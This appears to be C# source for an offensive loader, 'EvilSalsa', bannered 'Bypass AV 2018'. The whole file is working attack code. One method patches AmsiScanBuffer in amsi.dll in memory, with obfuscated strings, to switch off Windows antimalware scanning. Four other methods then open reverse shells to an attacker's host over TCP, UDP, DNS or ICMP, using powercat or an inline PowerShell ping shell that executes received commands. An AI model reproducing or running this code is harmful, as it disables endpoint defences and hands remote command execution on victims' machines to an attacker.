using System;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;


namespace EvilSalsa
{
    public class CyberVaca
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static void Parchea(string Salsa) {


                {
                    IntPtr TargetDLL = LoadLibrary(Salsa);
                    if (TargetDLL == IntPtr.Zero)
                    {
                        Console.WriteLine("[-] No se recibio la dll :(");
                        //return 1;
                    }

                    string Salseo = "Am" + "s" + "i";
                    string Salseo2 = "S" + "can";
                    string Salseo3 = "Bu" + "ffer";
                    string Salseo_Final = Salseo + Salseo2 + Salseo3;
                    IntPtr CabeshaOWned = GetProcAddress(TargetDLL, Salseo_Final);
                    if (CabeshaOWned == IntPtr.Zero)
                    {
                        Console.WriteLine("[-] No se recibio la funcion :(");
                        //return 1;
                    }

                    UIntPtr dwSize = (UIntPtr)5;
                    uint Zero = 0;
                    if (!VirtualProtect(CabeshaOWned, dwSize, 0x40, out Zero))
                    {
                        Console.WriteLine("[-] No tiene permisos :(");
                        //return 1;
                    }

                    string Ketchup = "B8A57A00A07A80AC3";
                    string[] XKetchup = Ketchup.Split('A');
                    byte[] XMostaza = new byte[XKetchup.Length];
                    for (int i = 0; i < XKetchup.Length; i++)
                    {
                        XMostaza[i] = Convert.ToByte(XKetchup[i], 16);
                    }

                    Byte[] Parcheo = XMostaza;
                    IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
                    Marshal.Copy(Parcheo, 0, unmanagedPointer, 6);
                    MoveMemory(CabeshaOWned, unmanagedPointer, 6);
                    Console.WriteLine("[+] Parcheado Correctamente.");
                }


            }

        public static void showbanner() {
            string banner = @"
  _____  ____  _     _____   ___   ___    
 / ___/ /    || |   / ___/  /  _] /   \
(   \_ |  o  || |  (   \_  /  [_ |     |
 \__  ||     || |___\__  ||    _]|  O  |  
 /  \ ||  _  ||     /  \ ||   [_ |     |  
 \    ||  |  ||     \    ||     ||     |  
  \___||__|__||_____|\___||_____| \___/   
                                                   
  _       ___    ____  ___      ___  ____  
 | |     /   \  /    ||   \    /  _]|    \ 
 | |    |     ||  o  ||    \  /  [_ |  D  )
 | |___ |  O  ||     ||  D  ||    _]|    / 
 |     ||     ||  _  ||     ||   [_ |    \ 
 |     ||     ||  |  ||     ||     ||  .  \
 |_____| \___/ |__|__||_____||_____||__|\_|
                              
                              Bypass AV 2018
";
            Console.Write(banner);

        }

        public static int reversetcp (string[] args)
        {

            CyberVaca.showbanner();
            string Salsa = "am" + "si" + ".dll";
            string checkdll = "c:\\Windows\\System32\\" + Salsa;
            if (System.IO.File.Exists(checkdll) == true) { CyberVaca.Parchea(Salsa); }
            string reversa = args[0].ToString();
            string ip = (reversa.Split(' ')[0]);
            string puerto = (reversa.Split(' ')[1]);
            if (System.IO.File.Exists(checkdll) == true) { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); } else { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); }
            //--------------------- Funciones para cargar ------------------------------
            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace( rspacecfg );
     		rspace.Open();            
     		Pipeline pipeline = rspace.CreatePipeline();

            //--------------------- Funciones para cargar ------------------------------
            pipeline.Commands.AddScript(SalseoLoader.powercat.powercatbase64());
            pipeline.Commands.AddScript(SalseoLoader.Load_Ps1.loadfileps1());
            pipeline.Commands.AddScript( "powercat -c " + ip + " -p " + puerto +" -ep");
            pipeline.Invoke();
            return 0;
        }

        public static int reverseudp(string[] args)
        {

            CyberVaca.showbanner();
            string Salsa = "am" + "si" + ".dll";
            string checkdll = "c:\\Windows\\System32\\" + Salsa;
            if (System.IO.File.Exists(checkdll) == true) { CyberVaca.Parchea(Salsa); }
            string reversa = args[0].ToString();
            string ip = (reversa.Split(' ')[0]);
            string puerto = (reversa.Split(' ')[1]);
            if (System.IO.File.Exists(checkdll) == true) { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); } else { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); }
            //--------------------- Funciones para cargar ------------------------------
            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
            rspace.Open();
            Pipeline pipeline = rspace.CreatePipeline();

            //--------------------- Funciones para cargar ------------------------------
            pipeline.Commands.AddScript(SalseoLoader.powercat.powercatbase64());
            pipeline.Commands.AddScript(SalseoLoader.Load_Ps1.loadfileps1());
            pipeline.Commands.AddScript("powercat -c " + ip + " -p " + puerto + " -ep -u");
            pipeline.Invoke();
            return 0;
        }

        public static int reversedns(string[] args)
        {

            CyberVaca.showbanner();
            string Salsa = "am" + "si" + ".dll";
            string checkdll = "c:\\Windows\\System32\\" + Salsa;
            if (System.IO.File.Exists(checkdll) == true) { CyberVaca.Parchea(Salsa); }
            string reversa = args[0].ToString();
            string ip = (reversa.Split(' ')[0]);
            string DNSServer = (reversa.Split(' ')[1]);
            if (System.IO.File.Exists(checkdll) == true) { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); } else { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); }
            //--------------------- Funciones para cargar ------------------------------
            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
            rspace.Open();
            Pipeline pipeline = rspace.CreatePipeline();

            //--------------------- Funciones para cargar ------------------------------
            pipeline.Commands.AddScript(SalseoLoader.powercat.powercatbase64());
            pipeline.Commands.AddScript(SalseoLoader.Load_Ps1.loadfileps1());
            pipeline.Commands.AddScript("powercat -c " + ip + " -dns " + DNSServer + " -ep --no-cache");
            pipeline.Invoke();
            return 0;
        }

        public static int reverseicmp(string[] args)
        {

            CyberVaca.showbanner();
            string Salsa = "am" + "si" + ".dll";
            string checkdll = "c:\\Windows\\System32\\" + Salsa;
            if (System.IO.File.Exists(checkdll) == true) { CyberVaca.Parchea(Salsa); }
            string reversa = args[0].ToString();
            string ip = (reversa.Split(' ')[0]);
            string puerto = (reversa.Split(' ')[1]);
            if (System.IO.File.Exists(checkdll) == true) { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); } else { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); }
            //--------------------- Funciones para cargar ------------------------------
            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
            rspace.Open();
            Pipeline pipeline = rspace.CreatePipeline();
            //--------------------- Funciones para cargar ------------------------------
            pipeline.Commands.AddScript(SalseoLoader.powercat.powercatbase64());
            pipeline.Commands.AddScript(SalseoLoader.Load_Ps1.loadfileps1());
            pipeline.Commands.AddScript("$ip='" + ip + "'; $ic=New-Object System.Net.NetworkInformation.Ping; $po=New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment=$true; function f($b) { $ic.Send($ip,60000,([text.encoding]::ASCII).GetBytes($b),$po) }; $p = -join('PS ',(gl).path,'> '); f($p); while ($true) { $r = f(''); if (!$r.Buffer) { continue }; $rs=([text.encoding]::ASCII).GetString($r.Buffer); if ($rs.StartsWith('EXIT')) { exit }; if ($rs.StartsWith('UPLOAD')) { [io.file]::AppendAllText('\a',$rs.Substring(7)); f('.'); } else { try { $rt=(iex -Command $rs | Out-String); } catch { f($_) }; $i=0; while ($i -lt $rt.length-120) { f($rt.Substring($i,120)); $i -= -120; }; f($rt.Substring($i)); $p = -join('PS ',(gl).path,'> '); f($p); }; }");
            pipeline.Invoke();
            return 0;
        }
    }

}
